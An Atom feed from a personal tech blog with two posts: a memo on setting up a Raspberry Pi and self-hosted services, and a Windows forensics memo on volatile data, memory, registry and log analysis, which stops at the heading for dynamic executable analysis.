<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Robin David]]></title>
  <link href="http://www.robindavid.fr/atom.xml" rel="self"/>
  <link href="http://www.robindavid.fr/"/>
  <updated>2014-03-02T11:00:09+00:00</updated>
  <id>http://www.robindavid.fr/</id>
  <author>
    <name><![CDATA[Robin David]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Raspberry Pi: First config and services configuration]]></title>
    <link href="http://www.robindavid.fr/blog/2013/01/28/raspberry-pi-first-config-and-services-configuration/"/>
    <updated>2013-01-28T00:00:00+00:00</updated>
    <id>http://www.robindavid.fr/blog/2013/01/28/raspberry-pi-first-config-and-services-configuration</id>
    <content type="html"><![CDATA[<h2>What is the Raspberry Pi ?</h2>
I think there&#8217;s no need to present the Pi anymore. This is basically a whole computer embed on chip based on ARM. It has been designed by David Braben. The official site is the following: <a href="http://www.raspberrypi.org/">http://www.raspberrypi.org/</a>
<br/>
<h2>Initial configuration</h2>
Here is a small memo of the things I do when I configure a Pi for the first time.

The first thing is to connect to the Pi using ssh the default login is <strong>pi</strong> and the password is <strong>raspberry</strong>. <span style="color: #ff0000;">So this will be the first thing to change !</span>
<br/>
<strong>sudo su</strong><br/>
<strong>passwd</strong>
Set a root passwd which is not the case by default.<br/>

<strong>passwd pi</strong>
Change the pi passwd ! (you might also delete the user and create a new one)<br/>

<strong>visudo</strong>
Remove pi from sudoers<br/>

<strong>aptitude update</strong><br/>
<strong>aptitude safe-upgrade</strong><br/>
<strong>aptitude install vim host htop</strong><br/><br/>
# Network Configuration
<strong>vim /etc/hostname</strong><br/>
<strong>vim /etc/network/interfaces</strong><br/>
<pre>
#iface eth0 inet static
#     address 192.168.0.5
#     network 192.168.0.0
#     netmask 255.255.255.0
#     broadcast 192.168.0.255
#     gateway 192.168.0.1
</pre>
<strong>vim /etc/resolv.conf</strong><br/>

<strong>raspi-config</strong>
#To enlarge the filesystem, disable X, and change timezone<br/><br/>

The default package repository (mirrordirector.raspbian.org) is not really reliable, and an update should sometimes in my case be relaunch few times to get through. So I use another package repository:
<br/><strong>echo &#8216;deb http://mirrors.ircam.fr/pub/raspbian/raspbian/ wheezy main contrib non-free rpi&#8217; &gt; /etc/apt/sources.list</strong><br/>

<h3>SSH Key exchange</h3>
For more simplicity I have put the public key of my main computer in the ssh authorized hosts of the pi to login automatically, here are the few steps to do.
<br/><br/>
On the local host:
<ul>
	<li><strong>ssh-keygen -t rsa</strong></li>
	<li><strong>scp .ssh/id_rsa.pub pi@192.168.0.5:~/</strong></li>
	<li><strong>echo &#8216;alias copi=&#8221;ssh pi@192.168.0.5 -X&#8221; &#8217; &gt;&gt; ~/.bashrc</strong></li>
</ul>
On the pi:
<ul>
	<li><strong>cat id_rsa.pub &gt;&gt; .ssh/authorized_keys</strong></li>
	<li><strong>chmod 600 .ssh/authorized_keys</strong></li>
</ul>


<h2>Services configuration</h2>
Small memo of the operations to perform to configure some services on the Raspberry.<br/><br/><br/>
<h3>OpenVPN</h3>
The following tutorial is really perfect: <a href="http://www.raspberrypi.org/phpBB3/viewtopic.php?f=36&amp;t=21566">http://www.raspberrypi.org/phpBB3/viewtopic.php?f=36&amp;t=21566</a>
<br/>
<span style="color: #0000ff;">Note: instead of copy/pasting the server.conf given, copy the one located in /usr/share/doc/openvpn/examples/sample-config-files/server.conf.gz</span>



<br/><br/><br/>
<h3>Etherpad-lite</h3>
Etherpad-lite is a collaborative text editor written in node.js. The installation and configuration is made easy by the usage of a script available on Github <a href="https://github.com/ghoulmann/raspi-etherpad-lite">here</a>.
<br/>
The script is called install_raspi_etherpad-lite.sh. I am used to change the port in the file to 8081 so that I keep the 8080 for proxy stuff.
<br/><br/>
./install_raspi_etherpad-lite.sh
<br/><br/>
Now etherpad should be installed if no errors occurs. Except few things:
<br/>
<strong>ln -s /usr/bin/nodejs /usr/bin/node</strong> (cause etherpad intent to launch node while the package install a binary called nodejs)
<br/>
Then you can start the application with <strong>/etc/init.d/etherpad-lite start</strong> (The first time you launch it. It can take a while to install all the dependencies and due to the low performance of the Pi)



<br/><br/><br/>
<h3>Libreplan</h3>
Libreplan is a wonderful project management web application. <a title="Libreplan" href="http://www.libreplan.com/" target="_blank">http://www.libreplan.com/</a>
<br/>
Libreplan is not available in package repositories but .deb packages are provided on the official website. The only problem is that there is no package for armhf. The application itself is just a tomcat application so there is no reason for it not to work on arm platforms. We will just need to tweak the .deb package to replace the architecture to armhf. The commands to perform are:
<br/><br/>
<strong>wget http://sourceforge.net/projects/libreplan/files/LibrePlan/libreplan_1.3.3-1_i386.deb</strong><br/>
<strong>ar vx libreplan_1.3.3-1_i386.deb</strong><br/>
<strong>mkdir -p libreplan_1.2.3-1_armhf/DEBIAN</strong><br/>
<strong>tar -C libreplan_1.2.3-1_armhf/DEBIAN/ -xvf control.tar.gz</strong><br/>
<strong>tar -C libreplan_1.2.3-1_armhf -xvf data.tar.gz</strong><br/>
<strong>sed -i &#8216;s/Architecture: .*/Architecture: armhf/&#8217; libreplan_1.2.3-1_armhf/DEBIAN/control</strong><br/>
<strong>dpkg-deb &#8211;build libreplan_1.2.3-1_armhf/</strong><br/>
<strong>aptitude install libpg-java postgresql cutycapt postgresql-client xvfb dbconfig-common ucf tomcat6</strong><br/>
<strong>dpkg -i libreplan_1.2.3-1_armhf.deb</strong>
<br/><br/>
To resume what commands does. We first download the i386 version of Libreplan, then we extract the .deb and we recreate the directory structure of the package. We replace the architecture into the file <em>control</em> using <strong>sed</strong> and we rebuild the package with <strong>dpkg-deb</strong>. Then we just have to install the package dependencies and to install our brand new package. And it works ;)
<br/>
The server is now listening on the port 8080, and is accessible on http://192.168.0.5:8080/libreplan. Be sure to <span style="text-decoration: underline;">change the admin password</span> and be patient the pi will certainly suffer of the load ^^.
<br/><br/>
Note: I prefer launching this kind of service on demand so I remove it from startup with : <strong>update-rc.d tomcat6 remove</strong>

<br/><br/><br/>
<h3>Codiad IDE</h3>
Codiad IDE is a web based <a title="Codiad IDE website" href="http://codiad.com/" target="_blank">IDE</a>, which allow to create workspace and support many functionnalities like code coloration etc. It is pretty light and does not require any DB. There is no difficulties in installing Codiad.<br/> The following steps allow to install Codiad:
<br/><br/>
<strong>wget https://github.com/Codiad/Codiad/zipball/master</strong><br/>
<strong>unzip master</strong><br/>
<strong>cd Codiad-Codiad-961e711/ </strong><span style="color: #3366ff;">#Adapt to the current github commit</span><br/>
<strong>mkdir /var/www/codiad</strong><br/>
<strong>cp -r * /var/www/codiad/</strong><br/>
<strong>mv /var/www/codiad/config.example.php /var/www/codiad/config.php</strong><br/>
<strong>chmod o+w /var/www/codiad/config.php /var/www/codiad/data/ /var/www/codiad/workspace/</strong>
<br/><br/>
Then there is to possibilities, either you modify the config file to modify the root path of codiad either you create a VirtualHost.
<br/>
<strong><span style="text-decoration: underline;">1st method</span></strong>:
<ul>
	<li><strong>sed -i &#8216;s/^\$rel.*/\$rel = &#34;\/codiad&#34;\;/ /var/wwww/codiad/config.php</strong></li>
	<li><strong>touch /var/www/codiad/plugins.php</strong></li>
</ul>
<strong><span style="text-decoration: underline;">2nd method:</span></strong>
<ul>
	<li><strong>touch /var/www/codiad/plugins.php</strong></li>
	<li><strong>echo &#8220;Listen 8081&#8221; &gt;&gt; /etc/apache2/ports.conf</strong></li>
	<li><strong>vim &gt; /etc/apache2/sites-available/codiad</strong>
<pre>
&lt;VirtualHost *:8081&gt;
    ServerAdmin webmaster@localhost
    DocumentRoot /var/www/codiad
    &lt;Directory /&gt;
        Options FollowSymLinks
        AllowOverride None
    &lt;/Directory&gt;
    &lt;Directory /var/www/codiad&gt;
        Options Indexes FollowSymLinks MultiViews
        AllowOverride None
        Order allow,deny
        allow from all
    &lt;/Directory&gt;
    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
&lt;/VirtualHost&gt;
</pre>
</li>
	<li><strong>a2ensite codiad</strong></li>
	<li><strong>service apache2 reload</strong></li>
</ul>


<br/><br/>
<h3>OpenMediaVault</h3>
OpenMediaVault is a NAS that allow to get a good control on the system which allow to transform the pi into a fully featured NAS. There is no package available and the OMV package repository should be added to the sources.list and to add the key of the repository.
<br/><br/>
<strong>echo &#8216;deb http://packages.omv-plugins.org fedaykin main&#8217; &gt;/etc/apt/sources.list.d/omv-plugins-org-fedaykin.list</strong><br/>
<strong>echo &#8216;deb http://packages.omv-plugins.org fedaykin-armhf main&#8217; &gt;/etc/apt/sources.list.d/omv-plugins-org-fedaykin-armhf.list</strong><br/>
<strong>wget -O - http://packages.omv-plugins.org/apt/99omv-plugins-org &gt; /etc/apt/preferences.d/99omv-plugins-org</strong><br/>
<strong>wget -O - http://packages.omv-plugins.org/omv-plugins.pub|apt-key add -</strong>
<br/><br/>
Then openmediavault can be installed. (If the installation fail due to <strong>tftpd-hpa</strong> change <em>TFTP_OPTIONS</em> to <em>TFTP_OPTIONS=&#8221;&#8211;secure &#8211;ipv4&#8221; in /etc/default/tftpd-hpa</em>)
<br/>
<strong>aptitude install openmediavault</strong>
<br/><br/>
You can also directly install OMV plugins from aptitude here are the available ones:
<ul>
	<li>openmediavault-autoshutdown - OpenMediaVault AutoShutdown</li>
	<li>openmediavault-clamav - OpenMediaVault ClamAV
p openmediavault-cups - OpenMediaVault CUPS (network printer server)</li>
	<li>openmediavault-dnsmasq - OpenMediaVault dnsmasq (local DNS and DHCP server)</li>
	<li>openmediavault-forkeddaapd - OpenMediaVault forked-daapd (DAAP server)</li>
	<li>openmediavault-git - OpenMediaVault Git (Git server)</li>
	<li>openmediavault-iscsitarget - OpenMediaVault iSCSI Enterprise Target</li>
	<li>openmediavault-ldap - OpenMediaVault Lightweight Directory Access Protocol (LDAP)</li>
	<li>openmediavault-lvm2 - OpenMediaVault Logical Volume Manager (LVM2)</li>
	<li>openmediavault-minidlna - OpenMediaVault miniDLNA (DLNA server)</li>
	<li>openmediavault-mysql - OpenMediaVault MySQL (MySQL database server)</li>
	<li>openmediavault-netatalk - OpenMediaVault netatalk (AppleTalk Protocol Suite)</li>
	<li>openmediavault-nut - OpenMediaVault Network UPS Tools (NUT)</li>
	<li>openmediavault-omvpluginsorg - OMV-Plugins.org Package Repositories for OpenMediaVault</li>
	<li>openmediavault-openvpn - OpenMediaVault OpenVPN (VPN server) plugin</li>
	<li>openmediavault-processlist - OpenMediaVault process list panel</li>
	<li>openmediavault-route - OpenMediaVault IP routing table</li>
	<li>openmediavault-subversion - OpenMediaVault Subversion (SVN server)</li>
	<li>openmediavault-transmissionbt - OpenMediaVault Transmission (BitTorrent client)</li>
	<li>openmediavault-virtualbox - OpenMediaVault VirtualBox</li>
	<li>openmediavault-website - OpenMediaVault Website plugin</li>
</ul>

I also like to make it listen on a specific port so I do the following:
<br/>
<strong>echo &#8216;Listen 8080&#8217; &gt;&gt; /etc/apache2/ports.conf</strong><br/>
<strong>sed -i &#8216;s/&lt;VirtualHost \*:80&gt;/&lt;VirtualHost \*:8080&gt;/&#8217; /etc/apache2/sites-available/openmediavault-webgui</strong><br/>



<br/><br/><br/>
<h3>Owncloud</h3>
Owncloud is an amazing private cloud, easy to be set up. The following commands show how to install and configure it with SSL.
<br/><br/>
<strong>aptitude install apache2 php5 php5-json php5-gd php5-sqlite curl libcurl3 libcurl4-openssl-dev php5-curl php5-gd php5-cgi php-pear php5-dev build-essential libpcre3-dev libapache2-mod-php5 php-apc</strong>
<br/><br/>
<strong>pecl install apc</strong><br/>
<strong>echo &#8220;apc.enabled=1&#8221; &gt;&gt; /etc/php5/cgi/conf.d/20-apc.ini</strong><br/>
<strong>echo &#8220;apc.shm_size=30&#8221; &gt;&gt; /etc/php5/cgi/conf.d/20-apc.ini</strong><br/>
<br/><br/>
<strong>vim /etc/php5/apache2/php.ini</strong><br/>
<span style="color: #3366ff;">#Change upload_max_size</span><br/>
<span style="color: #3366ff;">#Add extension=apc.so</span><br/>
<br/>
<strong>a2enmod rewrite</strong><br/>
<strong>a2enmod headers</strong><br/>
<br/>
<strong>openssl genrsa -des3 -out server.key 2048</strong><br/>
<strong>openssl rsa -in server.key -out server.key.insecure</strong><br/>
<strong>openssl req -new -key server.key -out server.csr</strong><br/>
<strong>openssl x509 -req -days 365 -in server.csr -signkey server.key -out server.crt</strong><br/>
<strong>cp server.crt /etc/ssl/certs</strong><br/>
<strong>cp server.key /etc/ssl/private</strong><br/>
<strong>a2enmod ssl</strong><br/>
<strong>a2ensite default-ssl</strong><br/>
<br/>
<strong>wget http://download.owncloud.org/community/owncloud-5.0.5.tar.bz2</strong><br/>
<strong>tar xvf owncloud-5.0.5.tar.bz2</strong><br/>
<strong>cp -r owncloud /var/www/</strong><br/>
<strong>chown -R www-data:www-data /var/www/owncloud/</strong><br/>

<br/><br/>
<h2>Useful links</h2>
<a href="http://www.cl.cam.ac.uk/projects/raspberrypi/tutorials/os/" target="_blank">OS Programming (Cambridge)</a>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Windows Forensic Memo]]></title>
    <link href="http://www.robindavid.fr/blog/2012/10/08/windows-forensic-memo/"/>
    <updated>2012-10-08T00:00:00+00:00</updated>
    <id>http://www.robindavid.fr/blog/2012/10/08/windows-forensic-memo</id>
    <content type="html"><![CDATA[<h2>I. Volative data acquisition</h2>
<h3 style="padding-left: 30px;">1. System date</h3>
<p style="padding-left: 60px;"><strong>date /t &amp; time /t</strong><br/>
<span style="color: #0000ff;">Note: Can also be done in python or perl</span><br/>
<span style="color: #ff0000;">Be careful: NTFS date use UTC while FAT use local time</span></p>

<h3 style="padding-left: 30px;">2. Connected users</h3>
<p style="padding-left: 60px;"><strong>psloggedon</strong> or  <strong>cmd : net sessions</strong> (shows IP)<br/>
<strong>logonsessions</strong> (shows every users last login date, NTLM, LAN..) or <strong>netusers</strong></p>

<h3 style="padding-left: 30px;">3. Opened files</h3>
<p style="padding-left: 60px;"><strong>Cmd : net file</strong> (on the network) / <strong>psfile</strong> (sysinternals)</p>

<h3 style="padding-left: 30px;">4. Network informations</h3>
<p style="padding-left: 60px;"><strong>nbtstat –c</strong> shows netbios cache <br/><span style="color: #0000ff;">Note: -A &lt;IP&gt; print the remote host table</span></p>

<h3 style="padding-left: 30px;">5. Network connections</h3>
<p style="padding-left: 60px;"><strong>netsat –ano</strong> print port and pid<br/>
<strong>netstat –r</strong> show the routing table</p>

<h3 style="padding-left: 30px;">6. Process informations</h3>
<p style="padding-left: 60px;"><strong>
Tlist</strong> have the advantage to show the absolute path of a process (now hard to find this utility)<br/>
<strong>Tasklist – v</strong> gives a lot of informations <br/><strong>tasklist –m wsock32.dll</strong> shows which process have loaded the library <br/><strong>tasklist –svc</strong> shows services informations<br/>
<strong>Pslist</strong> (sysinternal) gives also a lot informations (maybe my favorite) <br/><strong>–x</strong> shows memory informations and threads <br/><strong>-t</strong> shows the result as pstree under Linux does
<br/><strong>Listdlls</strong> Print all the dlls loaded by a process <br/><strong>-d wsock32.dll</strong> shows which processes uses the given dll<br/><br/>
<span style="color: #0000ff;">Note : In the end pslist and listdlls gives the same functionnalities than windows utilities</span>
<strong>Handle</strong> gives handles on files, ports, registry keys (<strong>-a</strong>) / <strong>-u</strong> for a given owner
</p>

<h3 style="padding-left: 30px;">7. Process/port correspondence</h3>
<p style="padding-left: 60px;"><strong>Netstat –anob</strong> Shows for each port the process name and the pid<br/>
<strong>Tcpview</strong> (sysinternals) shows everything needed (<strong>–a</strong>) / <strong>-c</strong> produce a csv result
</p>

<h3 style="padding-left: 30px;">8. Process memory</h3>
<p style="padding-left: 60px;"><strong>pmdump</strong> extract the memory of the process pid given in parameter</p>

<h3 style="padding-left: 30px;">9. Network state</h3>
<p style="padding-left: 60px;"><strong>Ipconfig /all</strong><br/>
<strong>Promiscdetect</strong> look for the promiscious mode state for every interface <br/><strong>promqry</strong>  Do basically the same <br/> ndis.pl
</p>

<h3 style="padding-left: 30px;">10. Clipboard</h3>
<p style="padding-left: 60px;"><strong>Pclip</strong> (unxutils) or script perl</p>

<h3 style="padding-left: 30px;">11. Drivers and services informations</h3>
<p style="padding-left: 60px;"><strong>svc</strong> (script perl) shows a lot about all services</p>

<h3 style="padding-left: 30px;">12. Command history</h3>
<p style="padding-left: 60px;"><strong>Doskey /history</strong> not stored so could by used only if an cmd.exe has been left open</p>

<h3 style="padding-left: 30px;">13. Drives connected</h3>
<p style="padding-left: 60px;"><strong>Di</strong> (script perl) shows all connected drives</p>

<h3 style="padding-left: 30px;">14. Shares</h3>
<p style="padding-left: 60px;"><strong>Share</strong> (script perl) shows all network shares</p>

<h2>II. Memory analysis</h2>
<h3 style="padding-left: 30px;">1. Memory gathering</h3>
<p style="padding-left: 60px;">For a process: <strong>volatility memdump –dump-dir test –f D:\myfile.img –p &lt;PID&gt;</strong>
or lspm.pl</p>
<p style="padding-left: 60px;">
For the whole RAM: <strong>mdd –o dump.dmp</strong> (bugged)<br/>
or <strong>Win32dd /r /f dump.dmp</strong> (win64dd for x64 systems)<br/>
Another possibility and my favorite to dump RAM is to use <strong>Memoryze</strong> which is pretty easy and straightforward to use.<br/>
<span style="color: #0000ff;">Note: In some cases we can force Windows hibernation which have in effect to create an hibernation file and so a memory dump.</span>
</p>
<p style="padding-left: 60px;">
To get the Windows version from memory dump use <strong>osid.pl &lt;DUMP&gt; </strong>(scripts) or <strong>volatility imageinfo –f &lt;FILE&gt;</strong>
</p>

<h3 style="padding-left: 30px;">2. Memory dump analysis</h3>
<p style="padding-left: 60px;">The best way to analyse memory is to use the <strong>volatility framework</strong> with all the different options.<br/>
Another possibility is to use <strong>auditviewer combined with memoryze</strong> which are very good and far easier to use than volatility.
</p>

<h3 style="padding-left: 30px;">3. Extract process image from memory</h3>
<p style="padding-left: 60px;">
<strong>Lspi.pl</strong> allow to extract a process from memory and take in argument process address.<br/>
<strong>Volatility procdump –f laptop.img –p &lt;PID&gt;</strong> extract process dump from memory.<br/>
This can be really useful when analyzing a packed or encrypted process which unpack himself in memory. The common utility of dumping process image is to compare it with the original one or a genuine one using fuzzy hashing algorithms.
<br/><strong>Ssdeep proc.img &gt; proc.img.hash </strong>This hash the process image in a file
<br/><strong>Ssdeep –v –m proc.img.hash C:&#46;..\proc.exe</strong> this compare the calculated hash with the original executable.
</p>

<h2>III. Registry analysis</h2>
<p style="padding-left: 30px;"><strong>HK_CLASSES_ROOT</strong> -&gt; We not often care about this hive, just contain files associations<br/>
<strong>HKLM\System</strong> -&gt; <strong>system32\config\System </strong>contains the system configuration<br/>
<strong>HKLM\SAM</strong> -&gt; <strong>system32\config\Sam </strong>contains the users accounts etc.<br/>
<strong>HKLM\Security</strong> -&gt; <strong>system32\config\Security </strong>contains security keys and parameters<br/>
<strong>HKLM\Software</strong> -&gt; <strong>system32\config\Software </strong>Softwares configurations (common for all users)<br/>
<strong>HKLM\Hardware</strong> -&gt; Volatile, created every boot.<br/>
<strong>HK_USERS\SID</strong> -&gt; <strong>C:\Users\&lt;NAME&gt;\ </strong>User informations
</p>
<p style="padding-left: 30px;">
To analyse statically the gathered hives to best tool is <strong>regripper. </strong>RR is the graphical tool and rip is the command line tool (most used). The following sections shows how to extract informations from various hives.
</p>

<h3 style="padding-left: 30px;">1. Information gathering</h3>
<ul style="padding-left: 60px;">
	<li>Windows version: <strong>rip.pl –p winver –r software</strong></li>
	<li>Computer name: <strong>rip.pl –p compname -r system</strong> <em>SYSTEM\CurrentControlSet\Control\ComputerName\ActiveComputerName</em></li>
	<li>Dernier arrêt ordinateur : rip.pl –p shutdown system (SYSTEM\Control00x\Control\Windows)</li>
	<li>Windows informations (key, owner and more): <strong>rip.pl –p winnt_cv software</strong> <em>SOFTWARE\Microsoft\Windows NT\CurrentVersion</em></li>
	<li>Timezone and last write: <strong>rip.pl –p timezone system</strong> <em>SYSTEM\CurrentControlSet\Control\TimeZoneInformation</em></li>
	<li>Network interfaces : <strong>rip.pl –p networkcards software</strong> <em>ControlSet00n\Services\Tcpip\Parameters\Interfaces</em> Note: For Vista use <strong>nic_mst2</strong> to get ip, mask and more</li>
	<li>MAC address: <strong>rip.pl –p macddr –r software/system</strong> (not always provided)</li>
	<li>Shares: <strong>rip.pl –p shares –r system</strong> <em>SYSTEM\CurrentControlSet\Services\lanmanserver\parameters</em></li>
	<li>Get audit policy: <strong>rip.pl –p auditpol –r security</strong></li>
	<li>Get event logs configuration: <strong>rip.pl –p eventlog –r system</strong></li>
	<li>SSID wifi : <strong>ripl.pl –p ssid -r software</strong></li>
	<li>DisableLastAccess: <strong>rip.pl –p disablelastaccess –r system</strong></li>
	<li>Bitbucket: (software) to get if the trash is active or not</li>
	<li>USBStor: (system) <strong>usbstor</strong> to get all the usb keys that have been plugged / <strong>devclass</strong> usb keys plugged sorted by last write / <strong>usbstor2</strong> return a result in csv / <strong>port_dev</strong> (software) allow to get informations about portable devices (friendlyname..)</li>
	<li>mp2: (ntuser) shows association between letters and volumes</li>
	<li>Users: <strong>rip.pl –p samparse –r SAM</strong></li>
</ul>

<h3 style="padding-left: 30px;">2. Startup areas in registry</h3>
<p style="padding-left: 60px;">Location launched at startup (cha\regref.xls enumerate locations)<br/>
List startup locations: <strong>rip.pl –p svc –r system </strong><br/><strong>svc2 </strong>more informations and results in csv<br/>
<span style="color: #0000ff;">Note : On a live system use <strong>regscan</strong></span>
</p>

<p style="padding-left: 60px;">
Each time an user log in the host, keys in the following locations are launched:<br/>
<em>HKLM\Software\Microsoft\Windows\CurrentVersion\Runonce</em> (and Run) (and HKCU)
</p>
<p style="padding-left: 60px;">
Automatic launch when accessing a specific file type:<br/>
<em>HKLM\Software\Classes\Exefile\Shell\Open\command</em><br/>
or <br/><em>HKCR\Exefile\Shell\Open\Command</em><br/>
<em>HKCR\XXX\shell\open\command</em> (with XXX the filetype)
</p>
<p style="padding-left: 60px;">
<em>HKLM\Software\Microsoft\Command Processor\AutoRun</em> (when launching cmd.exe so equivalent to bashrc)
</p>
<p style="padding-left: 60px;">
<strong>Autorun</strong> of sysinternals examine all the automatic startup locations
</p>

<p style="padding-left: 60px;">
<em>KLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDriveTypeAutoRun</em> define for each drive if the automatic launch with autorun.inf is activated
<br/><span style="color: #0000ff;">Note: Now it is taken in account only if the key HonorAutorunSetting is set to 0x1 in Policies\Explorer.</span>
</p>

<h3 style="padding-left: 30px;">3. Track user activities</h3>
<p style="padding-left: 60px;"><span style="text-decoration: underline;">Method UserAssist :</span> MRU : Most Recently Used<br/>
<em>Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\{GUID}\Count</em><br/>
<strong>RUNPATH</strong> : Absolut path -&gt; When the user double click in explorer or (Start -&gt; Execute)<br/>
<strong>RUNCPL</strong> : Configuration panel utility<br/>
<strong>RUNPIDL</strong> : Pointer in general an .lnk
</p>

<p style="padding-left: 60px;">
To get Most Recently Used software: <br/><strong>rip.pl –p userassist –r NTUSER.DAT</strong> (or <strong>userassist2</strong>)
</p>
<p style="padding-left: 60px;">
<span style="text-decoration: underline;">Method MUICache :</span><br/>
<em>Software\Microsoft\Windows\ShellNoRoam\MUICache</em><br/>
To get MUICache: <strong>rip.pl –p muicache –r NTUSER.DAT</strong> (but not date is recorded)
</p>

<span style="text-decoration: underline;padding-left: 60px;">Others MRU lists:</span>
<ul style="padding-left: 60px;">
<li>RecentDocs : <strong>rip.pl –p recentdocs –r ntuser.dat</strong></li>
<li>RunMRU:  <strong>rip.pl –p runmru –r ntuser.dat</strong> text typed in research field in Start menu</li>
<li>Be careful: The most recent element is the first letter in &#8220;MRULIist&#8221;</li>
<li>TypedURLS: <strong>rip.pl –p typedurls –r ntuser.dat</strong> urls typed in IE</li>
<li>Fileexts: <strong>rip.pl –p fileexts –r ntuse.dat</strong> for default application (even after deletion)</li>
<li>Acmru: <strong>rip.pl –p acmru – r ntuser.dat</strong> research made in research bar in explorer</li>
<li>Remote connections : <strong>rip.pl –p mndmru –r ntuser.dat</strong></li>
<li>Files opened with &#8220;Open with&#8221; and &#8220;Save as&#8221;: <strong>rip.pl –p comdlg32 –r ntuser.dat</strong></li>
<li>Windows Media Player files: <strong>rip.pl –p mpmru –r ntuser.dat</strong></li>
<li>Default user directory: <strong>rip.pl –p shellfolders –r ntuser.dat</strong></li>
</ul>

<p style="padding-left: 60px;">
<span style="color: #0000ff;">Note: Ripxp.pl allow to do the same as rip but on XP restoration points.</span><br/>
<span style="color: #0000ff;">Note: Another trick with registry hives to get deleted keys is to analyse the slack space. The tool regslack.exe (code\jt) with the hive in argument allow to do this.</span>
</p>

<h2>IV. Files analysis</h2>
<h3 style="padding-left: 30px;">1. Event logs files</h3>
<p style="padding-left: 60px;">Before doing any log analysis the best idea is to gather the log policy in the hives with regripper and the plugin auditpol (check the command above).</p>

<p style="padding-left: 60px;">
<strong>Evtstats.pl myfile.evt</strong> allow to get statistics about the given logs like the number of entries etc.<br/>
<strong>Evtrpt.pl myfile.evt</strong> shows stats differently sorting them by eventid.<br/>
<strong>Lsevt.pl myfile.evt</strong> shows the logs in a visible manner (<strong>lsevt2</strong> make an csv output)<br/>
<strong>Evt2xls –e myfile.evt –o output.xls</strong> read the given log and create an excel sheet with all the logs<br/>
<span style="color: #0000ff;">Note : This works for XP not vista which use a XML formating</span>.
</p>

<p style="padding-left: 60px;">
On a live vista <strong>wevtutils el</strong> (shows available logs) and <strong>wevtutil gl &lt;FILE&gt;</strong> print informations about the log file. To parse logs on vista the best tool is<strong> LogParser</strong>.
</p>

<span style="text-decoration: underline;padding-left: 60px;">Interesting logs are:</span>
<ul style=";padding-left: 60px;">
<li><strong>IE history</strong>: Local Settings\Temporary Internet Files\Content.IE5</li>
<li><strong>Setuplog.txt</strong> : Located in the Windows directory. It contains logs about Windows installation date..</li>
<li><strong>Setupact.log</strong> : Contain logs about gaphical part of the Windows installation.</li>
<li><strong>Setupapi.log</strong> : Contain logs about devices installations, bugfix, patch etc. (very important)</li>
<li><strong>Netsetup.log</strong> : Located in Windows\Debug shows workgroup changes on the network</li>
<li><strong>Schedlgu.txt</strong> : In C:\Windows for &lt;=XP or C:\Windows\Taks for Vista&gt;= and contains history of all tasks executed by at.exe (equivalent to cron)</li>
<li><strong>Pfirewall.log</strong> : Firewall logs in C:\Windows</li>
<li><strong>Mrt.log</strong>: Mrt logs. Mrt is the malware detection tool (C:\Windows\Debug)</li>
<li><strong>Dr. Watson</strong> : Contain logs about software crash (and report send). It is located in C:\Documents and Settings\All Users\Application Data\Microsoft\Dr Watson\drwtsn32.log and the configuration file is in <em>HKLM\SOFTWARE\Microsoft\DrWatson</em>. The file is called user.dmp and keeps pages used by the process when crashing.
<br/><span style="color: #0000ff;">Note: Only on file is kept so everytime a software crash it replace the file.</span></li>
<li><strong>Cbs.log</strong>: Windows\Logs\Cbs\cbs.log for Vista and +. It contains package manager logs</li>
<li><strong>Trash</strong> : recbin.pl (or Rifiuti) followed by the INFO2 file allow to get the list of the deleted files and theirs original location. INFO2 is located in the Recycler directory at the root of every disk and in every UID directory (because every users have a different directory). On vista et + info2 informations are stored in files starting by &#8220;$I&#8221;.</li>
<li><strong>Rp.log</strong>: located in every restoration point directory.</li>
</ul>

<h3 style="padding-left: 30px;">2. Other files</h3>
<p style="padding-left: 60px;">Prefetch : <em>HKLM\SYSTEM\ControlSet00x\Control\Session Manager\Memory Management\PrefetchParameters</em> define if applications should be prefetched or not</p>
<p style="padding-left: 60px;">
Prefetch files are located in C:\Windows\Prefetch.<br/>
<strong>pref.pl</strong> (ch5\code) and <strong>vista_pref.pl</strong> allows to analyse prefetch files for both XP and Vista.
<p style="padding-left: 60px;">
Shortcuts : <strong>lslnk.pl</strong> gives informations about files pointed by the .lnk
</p>
<p style="padding-left: 60px;">
Word documents: Meta datas can be printed thank&#8217;s to <strong>wmd.pl</strong> (ch5\code) which shows the last authors, language etc. <strong>oledmp.pl</strong> allows to get documents stream objects.
</p>
<p style="padding-left: 60px;">
PDF : <strong>pdfmeta.pl</strong> and or <strong>pdfdmp.pl</strong>
</p>
<p style="padding-left: 60px;">
Meta data of images: <strong>exifer</strong>
</p>
<p style="padding-left: 60px;">
Files signatures : <strong>sigs.pl</strong> checks if the extension is in accordance with the file signature
</p>
<p style="padding-left: 60px;">
Check ADS  !
</p>
<p style="padding-left: 60px;">
A good idea is also to make a virus analysis mounting the drive in read only and also to use <strong>sigcheck</strong> (sysinternal) which look for all unsigned exe located in the given directory (system32).
</p>

<h2>V. Executables analysis</h2>
<h3 style="padding-left: 30px;">1. Static analysis</h3>
<p style="padding-left: 60px;">For an in-depth analysis of executables the first thing to do is to select some. To filter interesting ones a good idea is to analyse ones that where running when the system shuts down. So it is better to focus of process stored in RAM. We can also analyse unsigned exe located in system32 which are suspect or also exe referenced in an automatic startup location in the registry.
</p>

<span style="text-decoration: underline;padding-left: 60px;">Quick procedure :</span>
<ul style="padding-left: 90px;">
	<li>Note the absolute path of the executable.</li>
	<li>Current OS, version and filesystem</li>
	<li>Hash of the file</li>
	<li>Analysis of the hash by virustotal (or another)</li>
	<li>Use <strong>strings</strong> to get a brief idea of the content or <strong>bintext </strong>which is more graphical</li>
	<li>PE header analysis with tools like <strong>pied</strong> or <strong>cmd: pedump</strong></li>
	<li>Check the IMPORT table to see all the libraries used by the program (and especially network access dlls)</li>
	<li>EXPORT table functions that can be used when the exe is used as a library</li>
	<li>Resources which contains icons, version and other informations. <strong>Fvi.pl</strong> (ch6) allow to gather all informations of the resource section.</li>
</ul>

<h3 style="padding-left: 30px;">2. Dynamic analysis</h3>
